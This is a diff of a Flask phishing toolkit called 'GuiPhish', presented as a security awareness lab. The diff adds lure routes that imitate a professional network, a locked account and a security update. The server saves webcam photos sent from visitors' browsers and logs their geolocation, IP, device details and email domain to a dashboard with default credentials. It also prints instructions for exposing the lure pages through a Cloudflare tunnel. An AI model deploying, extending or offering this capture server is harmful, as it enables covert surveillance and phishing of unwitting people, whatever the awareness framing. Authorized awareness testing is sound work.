@@ -6,6 +6,28 @@ import base64
 from datetime import datetime
 from flask import Flask, request, jsonify, send_file, redirect, session
 
+# ================= PATHS =================
+
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+ROOT_DIR = os.path.abspath(os.path.join(BASE_DIR, ".."))
+
+WEB_DIR = os.path.join(ROOT_DIR, "web")
+TEMPLATES_DIR = os.path.join(WEB_DIR, "templates")
+PAGES_DIR = os.path.join(WEB_DIR, "pages")
+DATA_DIR = os.path.join(ROOT_DIR, "data")
+
+LOGS_DIR = os.path.join(DATA_DIR, "logs")
+FOTOS_DIR = os.path.join(DATA_DIR, "fotos")
+RELATORIOS_DIR = os.path.join(DATA_DIR, "reports")
+SESSIONS_DIR = os.path.join(DATA_DIR, "sessions")
+
+PASTAS = [LOGS_DIR, FOTOS_DIR, RELATORIOS_DIR, SESSIONS_DIR]
+
+for pasta in PASTAS:
+    os.makedirs(pasta, exist_ok=True)
+
+EVENTOS_FILE = os.path.join(LOGS_DIR, "eventos.jsonl")
+
 # ================= CONFIG =================
 
 DASHBOARD_USER = os.environ.get("DASHBOARD_USER", "admin")
@@ -13,11 +35,6 @@ DASHBOARD_PASS = os.environ.get("DASHBOARD_PASS", "guiphish")
 
 app = Flask(__name__)
 app.secret_key = os.environ.get("APP_SECRET_KEY", "guiphish_dashboard_secret")
-
-PASTAS = ["logs", "fotos", "relatorios"]
-
-for pasta in PASTAS:
-    os.makedirs(pasta, exist_ok=True)
 
 # ================= CORES =================
 
@@ -34,85 +51,11 @@ CLEAR = "\033[2J\033[H"
 BANNERS = [
 f"""
 {BLUE}
-  ██████╗ ██╗   ██╗██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
- ██╔════╝ ██║   ██║██║██╔══██╗██║  ██║██║██╔════╝██║  ██║
- ██║  ███╗██║   ██║██║██████╔╝███████║██║███████╗███████║
- ██║   ██║██║   ██║██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
- ╚██████╔╝╚██████╔╝██║██║     ██║  ██║██║███████║██║  ██║
-  ╚═════╝  ╚═════╝ ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
-{RED}
-        🔐 GuiPhish Awareness Lab
-        🎣 Security Awareness Toolkit
-        🐧 Running on Kali Linux
-        CRIADO POR: Geovanni Andrade
-{RESET}
-""",
-
-f"""
-{RED}
-  ██████╗ ██╗   ██╗██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
- ██╔════╝ ██║   ██║██║██╔══██╗██║  ██║██║██╔════╝██║  ██║
- ██║  ███╗██║   ██║██║██████╔╝███████║██║███████╗███████║
- ██║   ██║██║   ██║██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
- ╚██████╔╝╚██████╔╝██║██║     ██║  ██║██║███████║██║  ██║
-  ╚═════╝  ╚═════╝ ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
-{BLUE}
-        📊 Logs • Dashboard • Reports
-        🧠 Browser Permission Awareness
-        ⚠️ Authorized Lab Only
-{RESET}
-""",
-
-f"""
-{BLUE}
-   _____       _ _____  _     _     _
-  / ____|     (_)  __ \\| |   (_)   | |
- | |  __ _   _ _| |__) | |__  _ ___| |__
- | | |_ | | | | |  ___/| '_ \\| / __| '_ \\
- | |__| | |_| | | |    | | | | \\__ \\ | | |
-  \\_____|\\__,_|_|_|    |_| |_|_|___/_| |_|
-{RED}
-        🔐 GuiPhish Toolkit
-        📸 Camera • 🌍 Location • 📧 Email
-        📊 Dashboard Enabled
-{RESET}
-""",
-
-f"""
-{RED}
-   ▄████  █    ██  ██▓ ██▓███   ██░ ██
-  ██▒ ▀█▒ ██  ▓██▒▓██▒▓██░  ██▒▓██░ ██▒
- ▒██░▄▄▄░▓██  ▒██░▒██▒▓██░ ██▓▒▒██▀▀██░
- ░▓█  ██▓▓▓█  ░██░░██░▒██▄█▓▒ ▒░▓█ ░██
- ░▒▓███▀▒▒▒█████▓ ░██░▒██▒ ░  ░░▓█▒░██▓
-{BLUE}
-        🌍 Geolocation Awareness Lab
-        🛡️ Controlled Security Simulation
-        👤 Created by Geovanni Andrade
-{RESET}
-""",
-
-f"""
-{BLUE}
-╔══════════════════════════════════════════════════════╗
-║                  GUIPHISH LAB                       ║
-║        Browser Permission Awareness Toolkit          ║
-╚══════════════════════════════════════════════════════╝
-{RED}
-        📸 Camera Capture Simulation
-        🌍 Location Permission Simulation
-        📧 Email/Account Awareness
-        🧾 Reports • 📊 Dashboard • 🧹 Cleanup
-{RESET}
-""",
-
-f"""
-{RED}
 ╔══════════════════════════════════════════════════════╗
 ║                  GUIPHISH                           ║
 ║             Security Awareness Platform              ║
 ╚══════════════════════════════════════════════════════╝
-{BLUE}
+{RED}
         🔐 Authorized Testing Only
         📊 SOC-style Dashboard
         🐧 Kali Linux Ready
@@ -124,14 +67,12 @@ f"""
 # ================= FUNÇÕES =================
 
 def ler_eventos():
-    caminho = "logs/eventos.jsonl"
-
-    if not os.path.exists(caminho):
+    if not os.path.exists(EVENTOS_FILE):
         return []
 
     eventos = []
 
-    with open(caminho, "r", encoding="utf-8") as f:
+    with open(EVENTOS_FILE, "r", encoding="utf-8") as f:
         for linha in f:
             try:
                 eventos.append(json.loads(linha))
@@ -139,6 +80,25 @@ def ler_eventos():
                 pass
 
     return eventos
+
+
+def calcular_tempos(eventos):
+    tempos_resposta = [
+        e.get("tempo_resposta")
+        for e in eventos
+        if isinstance(e.get("tempo_resposta"), (int, float))
+    ]
+
+    if tempos_resposta:
+        tempo_medio = round(sum(tempos_resposta) / len(tempos_resposta) / 1000, 2)
+        tempo_minimo = round(min(tempos_resposta) / 1000, 2)
+        tempo_maximo = round(max(tempos_resposta) / 1000, 2)
+    else:
+        tempo_medio = 0
+        tempo_minimo = 0
+        tempo_maximo = 0
+
+    return tempo_medio, tempo_minimo, tempo_maximo
 
 
 def mostrar_logs():
@@ -151,18 +111,16 @@ def mostrar_logs():
         return
 
     for evento in eventos[-10:]:
+        tempo = evento.get("tempo_resposta")
+        tempo_formatado = f"{round(tempo / 1000, 2)}s" if isinstance(tempo, (int, float)) else "N/A"
+
         print(
             f"{GREEN}- {evento.get('timestamp')}{RESET} | "
             f"{evento.get('tipo')} | "
             f"{evento.get('status')} | "
+            f"Tempo: {tempo_formatado} | "
             f"IP: {evento.get('ip')}"
         )
-
-        if evento.get("google_maps") not in [None, "N/A"]:
-            print(f"  🌍 Maps: {evento.get('google_maps')}")
-
-        if evento.get("email_domain") not in [None, "N/A"]:
-            print(f"  📧 Domínio: {evento.get('email_domain')}")
 
     print("")
 
@@ -171,14 +129,20 @@ def gerar_relatorio():
     eventos = ler_eventos()
 
     fotos = []
-    if os.path.exists("fotos"):
-        fotos = [f for f in os.listdir("fotos") if f.endswith(".jpg")]
+    if os.path.exists(FOTOS_DIR):
+        fotos = [f for f in os.listdir(FOTOS_DIR) if f.endswith(".jpg")]
 
     total_camera = len([e for e in eventos if e.get("tipo") == "camera"])
     total_localizacao = len([e for e in eventos if e.get("tipo") == "localizacao"])
     total_email = len([e for e in eventos if e.get("tipo") == "email"])
+    total_template = len([e for e in eventos if e.get("tipo") == "template"])
 
-    nome = f"relatorios/relatorio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+    tempo_medio, tempo_minimo, tempo_maximo = calcular_tempos(eventos)
+
+    nome = os.path.join(
+        RELATORIOS_DIR,
+        f"relatorio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+    )
 
     with open(nome, "w", encoding="utf-8") as f:
         f.write("GuiPhish Awareness Lab - Relatório\n")
@@ -188,7 +152,11 @@ def gerar_relatorio():
         f.write(f"Eventos de câmera: {total_camera}\n")
         f.write(f"Eventos de localização: {total_localizacao}\n")
         f.write(f"Eventos de e-mail/conta: {total_email}\n")
-        f.write(f"Fotos salvas: {len(fotos)}\n\n")
+        f.write(f"Eventos de templates: {total_template}\n")
+        f.write(f"Fotos salvas: {len(fotos)}\n")
+        f.write(f"Tempo médio de resposta: {tempo_medio}s\n")
+        f.write(f"Menor tempo de resposta: {tempo_minimo}s\n")
+        f.write(f"Maior tempo de resposta: {tempo_maximo}s\n\n")
         f.write("Últimos eventos:\n")
 
         for evento in eventos[-20:]:
@@ -198,7 +166,7 @@ def gerar_relatorio():
 
 
 def limpar_evidencias():
-    confirmacao = input(f"\n{RED}[!] Apagar fotos, logs e relatórios locais? Digite SIM para confirmar: {RESET}")
+    confirmacao = input(f"\n{RED}[!] Apagar dados locais? Digite SIM para confirmar: {RESET}")
 
     if confirmacao != "SIM":
         print(f"{YELLOW}[+] Operação cancelada.{RESET}\n")
@@ -214,15 +182,25 @@ def limpar_evidencias():
 
 def menu():
     print(f"\n{CYAN}[+] GuiPhish Awareness Lab{RESET}\n")
-    print("1) 📸 Testar permissão de câmera")
-    print("2) 🌍 Testar permissão de localização")
+    print("1) 📸 Testar permissão de câmera/localização")
+    print("2) 🎯 Escolher template de simulação")
     print("3) 📊 Dashboard / login")
     print("4) 🧾 Gerar relatório do lab")
     print("5) 🧹 Limpar evidências locais")
-    print("6) 📧 Simulação de e-mail/conta")
-    print("7) 🛑 Sair")
+    print("6) 🛑 Sair")
 
     return input(f"\n{BLUE}Digite a opção: {RESET}")
+
+
+def menu_templates():
+    print(f"\n{CYAN}[+] Escolha o template de simulação:{RESET}\n")
+    print("1) 💼 Rede profissional")
+    print("2) 🔒 Conta bloqueada")
+    print("3) 🛡️ Atualização de segurança")
+    print("4) 📧 E-mail/conta")
+    print("5) ↩ Voltar")
+
+    return input(f"\n{BLUE}Digite a opção do template: {RESET}")
 
 
 def autenticado():
@@ -232,12 +210,32 @@ def autenticado():
 
 @app.route("/")
 def index():
-    return send_file("index.html")
+    return send_file(os.path.join(TEMPLATES_DIR, "camera-check", "index.html"))
 
 
 @app.route("/email")
 def email():
-    return send_file("email.html")
+    return send_file(os.path.join(TEMPLATES_DIR, "email-check", "index.html"))
+
+
+@app.route("/linkedin")
+def linkedin():
+    return send_file(os.path.join(TEMPLATES_DIR, "linkedin", "index.html"))
+
+
+@app.route("/conta-bloqueada")
+def conta_bloqueada():
+    return send_file(os.path.join(TEMPLATES_DIR, "conta-bloqueada", "index.html"))
+
+
+@app.route("/atualizacao-seguranca")
+def atualizacao_seguranca():
+    return send_file(os.path.join(TEMPLATES_DIR, "atualizacao-seguranca", "index.html"))
+
+
+@app.route("/awareness")
+def awareness():
+    return send_file(os.path.join(PAGES_DIR, "awareness.html"))
 
 
 @app.route("/foto/<nome>")
@@ -246,7 +244,7 @@ def foto(nome):
         return redirect("/login")
 
     nome_seguro = os.path.basename(nome)
-    caminho = os.path.join("fotos", nome_seguro)
+    caminho = os.path.join(FOTOS_DIR, nome_seguro)
 
     if not os.path.exists(caminho):
         return "Foto não encontrada", 404
@@ -354,24 +352,34 @@ def dashboard():
     eventos = ler_eventos()
     fotos = []
 
-    if os.path.exists("fotos"):
-        fotos = sorted([f for f in os.listdir("fotos") if f.endswith(".jpg")], reverse=True)
+    if os.path.exists(FOTOS_DIR):
+        fotos = sorted([f for f in os.listdir(FOTOS_DIR) if f.endswith(".jpg")], reverse=True)
 
     total_camera = len([e for e in eventos if e.get("tipo") == "camera"])
     total_localizacao = len([e for e in eventos if e.get("tipo") == "localizacao"])
     total_email = len([e for e in eventos if e.get("tipo") == "email"])
+    total_template = len([e for e in eventos if e.get("tipo") == "template"])
+
+    tempo_medio, tempo_minimo, tempo_maximo = calcular_tempos(eventos)
 
     ultimos_eventos_html = ""
 
     for e in eventos[-30:][::-1]:
         maps = ""
-        email = ""
+        email_info = ""
+        template_info = ""
 
         if e.get("google_maps") not in [None, "N/A"]:
             maps = f"<a href='{e.get('google_maps')}' target='_blank'>🌍 Google Maps</a>"
 
         if e.get("email_domain") not in [None, "N/A"]:
-            email = f"<span>📧 {e.get('email_domain')}</span>"
+            email_info = f"<span>📧 {e.get('email_domain')}</span>"
+
+        if e.get("template") not in [None, "N/A"]:
+            template_info = f"<span>🎯 {e.get('template')}</span>"
+
+        tempo = e.get("tempo_resposta")
+        tempo_formatado = f"{round(tempo / 1000, 2)}s" if isinstance(tempo, (int, float)) else "N/A"
 
         ultimos_eventos_html += f"""
         <tr>
@@ -379,7 +387,8 @@ def dashboard():
             <td>{e.get('tipo')}</td>
             <td>{e.get('status')}</td>
             <td>{e.get('ip')}</td>
-            <td>{maps} {email}</td>
+            <td>{tempo_formatado}</td>
+            <td>{maps} {email_info} {template_info}</td>
         </tr>
         """
 
@@ -434,7 +443,7 @@ button, .btn {{
 }}
 .cards {{
     display: grid;
-    grid-template-columns: repeat(4, 1fr);
+    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
     gap: 15px;
     margin-bottom: 25px;
 }}
@@ -443,7 +452,6 @@ button, .btn {{
     border: 1px solid #1f2937;
     border-radius: 14px;
     padding: 20px;
-    box-shadow: 0 0 18px rgba(56,189,248,0.08), 0 0 18px rgba(239,68,68,0.08);
 }}
 .card h2 {{
     margin: 0;
@@ -515,6 +523,10 @@ canvas {{
         <div class="card"><h2>{total_camera}</h2><p>Câmera</p></div>
         <div class="card"><h2>{total_localizacao}</h2><p>Localização</p></div>
         <div class="card"><h2>{total_email}</h2><p>E-mail</p></div>
+        <div class="card"><h2>{total_template}</h2><p>Templates</p></div>
+        <div class="card"><h2>{tempo_medio}s</h2><p>Tempo médio</p></div>
+        <div class="card"><h2>{tempo_minimo}s</h2><p>Menor tempo</p></div>
+        <div class="card"><h2>{tempo_maximo}s</h2><p>Maior tempo</p></div>
     </div>
 
     <div class="grid">
@@ -541,6 +553,7 @@ canvas {{
                 <th>Tipo</th>
                 <th>Status</th>
                 <th>IP</th>
+                <th>Tempo</th>
                 <th>Detalhes</th>
             </tr>
             {ultimos_eventos_html}
@@ -555,12 +568,12 @@ const ctx = document.getElementById('grafico');
 new Chart(ctx, {{
     type: 'bar',
     data: {{
-        labels: ['Câmera', 'Localização', 'E-mail'],
+        labels: ['Câmera', 'Localização', 'E-mail', 'Templates'],
         datasets: [{{
             label: 'Eventos',
-            data: [{total_camera}, {total_localizacao}, {total_email}],
-            backgroundColor: ['#38bdf8', '#ef4444', '#38bdf8'],
-            borderColor: ['#93c5fd', '#fca5a5', '#93c5fd'],
+            data: [{total_camera}, {total_localizacao}, {total_email}, {total_template}],
+            backgroundColor: ['#38bdf8', '#ef4444', '#38bdf8', '#f59e0b'],
+            borderColor: ['#93c5fd', '#fca5a5', '#93c5fd', '#fbbf24'],
             borderWidth: 1
         }}]
     }},
@@ -602,6 +615,8 @@ def evento():
         "tipo": tipo,
         "acao": data.get("acao", "N/A"),
         "status": data.get("status", "N/A"),
+        "template": data.get("template", "N/A"),
+        "tempo_resposta": data.get("tempo_resposta", "N/A"),
         "user_agent": data.get("userAgent", "N/A"),
         "platform": data.get("platform", "N/A"),
         "language": data.get("language", "N/A"),
@@ -610,16 +625,10 @@ def evento():
         "email_domain": data.get("email_domain", "N/A")
     }
 
-    with open("logs/eventos.jsonl", "a", encoding="utf-8") as f:
+    with open(EVENTOS_FILE, "a", encoding="utf-8") as f:
         f.write(json.dumps(evento_log, ensure_ascii=False) + "\n")
 
     print(f"\n{GREEN}[+] EVENTO REGISTRADO:{RESET} {tipo} | {evento_log['status']} | IP: {request.remote_addr}")
-
-    if evento_log["google_maps"] != "N/A":
-        print(f"{BLUE}[+] Google Maps:{RESET} {evento_log['google_maps']}")
-
-    if tipo == "email":
-        print(f"{CYAN}[+] Domínio informado:{RESET} {evento_log['email_domain']}")
 
     return jsonify({"ok": True})
 
@@ -636,14 +645,15 @@ def capture():
         img = data.get("image").split(",")[1]
         img_bytes = base64.b64decode(img)
 
-        nome = f"fotos/{datetime.now().strftime('%Y%m%d_%H%M%S_%f')}.jpg"
+        nome_arquivo = f"{datetime.now().strftime('%Y%m%d_%H%M%S_%f')}.jpg"
+        caminho = os.path.join(FOTOS_DIR, nome_arquivo)
 
-        with open(nome, "wb") as f:
+        with open(caminho, "wb") as f:
             f.write(img_bytes)
 
-        print(f"{GREEN}[+] FOTO SALVA:{RESET} {nome}")
+        print(f"{GREEN}[+] FOTO SALVA:{RESET} {caminho}")
 
-        return jsonify({"ok": True, "arquivo": nome})
+        return jsonify({"ok": True, "arquivo": nome_arquivo})
 
     except Exception as e:
         print(f"{RED}[-] Erro ao salvar foto:{RESET} {e}")
@@ -659,14 +669,53 @@ if __name__ == "__main__":
         escolha = menu()
 
         if escolha == "1":
-            print(f"\n{GREEN}[+] Modo câmera ativo. Iniciando Flask...{RESET}")
-            print("[+] Use o link principal do Cloudflared.\n")
+            print(f"\n{GREEN}[+] Modo câmera/localização ativo. Iniciando Flask...{RESET}")
+            print(f"{YELLOW}[!] Como usar:{RESET}")
+            print("    Use o link principal do Cloudflare:")
+            print("    https://SEU-LINK.trycloudflare.com/")
+            print("")
             break
 
         elif escolha == "2":
-            print(f"\n{GREEN}[+] Modo localização ativo. Iniciando Flask...{RESET}")
-            print("[+] Use o link principal do Cloudflared.\n")
-            break
+            escolha_template = menu_templates()
+
+            if escolha_template == "1":
+                print(f"\n{GREEN}[+] Template Rede Profissional selecionado.{RESET}")
+                print(f"{YELLOW}[!] Como usar:{RESET}")
+                print("    Use o link do Cloudflare com o caminho:")
+                print("    https://SEU-LINK.trycloudflare.com/linkedin")
+                print("")
+                break
+
+            elif escolha_template == "2":
+                print(f"\n{GREEN}[+] Template Conta Bloqueada selecionado.{RESET}")
+                print(f"{YELLOW}[!] Como usar:{RESET}")
+                print("    Use o link do Cloudflare com o caminho:")
+                print("    https://SEU-LINK.trycloudflare.com/conta-bloqueada")
+                print("")
+                break
+
+            elif escolha_template == "3":
+                print(f"\n{GREEN}[+] Template Atualização de Segurança selecionado.{RESET}")
+                print(f"{YELLOW}[!] Como usar:{RESET}")
+                print("    Use o link do Cloudflare com o caminho:")
+                print("    https://SEU-LINK.trycloudflare.com/atualizacao-seguranca")
+                print("")
+                break
+
+            elif escolha_template == "4":
+                print(f"\n{GREEN}[+] Template E-mail/Conta selecionado.{RESET}")
+                print(f"{YELLOW}[!] Como usar:{RESET}")
+                print("    Use o link do Cloudflare com o caminho:")
+                print("    https://SEU-LINK.trycloudflare.com/email")
+                print("")
+                break
+
+            elif escolha_template == "5":
+                continue
+
+            else:
+                print(f"\n{RED}[!] Opção inválida no menu de templates.{RESET}\n")
 
         elif escolha == "3":
             print(f"\n{GREEN}[+] Dashboard disponível em:{RESET}")
@@ -683,11 +732,6 @@ if __name__ == "__main__":
             limpar_evidencias()
 
         elif escolha == "6":
-            print(f"\n{GREEN}[+] Página de e-mail disponível em:{RESET}")
-            print("    https://SEU-LINK.trycloudflare.com/email\n")
-            break
-
-        elif escolha == "7":
             print(f"\n{YELLOW}[+] Saindo...{RESET}\n")
             exit()
 
